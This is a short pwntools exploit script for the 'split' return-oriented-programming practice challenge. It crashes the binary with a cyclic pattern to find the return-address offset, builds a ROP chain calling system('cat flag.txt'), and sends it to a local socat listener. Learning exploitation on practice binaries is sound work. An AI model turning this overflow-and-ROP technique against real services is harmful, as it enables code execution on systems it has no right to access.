from pwn import *

#use the following command to have the binary listening on localhost:1234
#socat TCP4-LISTEN:1234,reuseaddr,fork EXEC:./split

context.clear(arch="amd64") #we need to specify this otherwise ropchain will fail

LOCATION = "./split"
REMOTE   = remote("localhost", 1234) #binary listening on the machine

binary = ELF(LOCATION)
rop    = ROP(LOCATION)

def pcOffset(): 
    proc = process(LOCATION, timeout=2)     #start process to fuzz
    proc.sendline(cyclic(1024, n=8))        #crash process with cyclic pattern
    proc.recvall()                      
    core = Core("core")                     #open core file
    pcOff = cyclic_find(core.pc, n=8)       #find RIP offset using cyclic finder
    return 'A' * pcOff

def exploit():
    string = next(binary.search("cat flag.txt"))
    rop.system(string)          #generate ropchain to call system("cat flag.txt")
    exp  = pcOffset()           #overflow buffer
    exp += str(rop)             #append ropchain     
    REMOTE.recvuntil('>')
    REMOTE.sendline(exp)        #send exploit
    log.success("Flag:{0}".format(REMOTE.recvall()))

exploit()

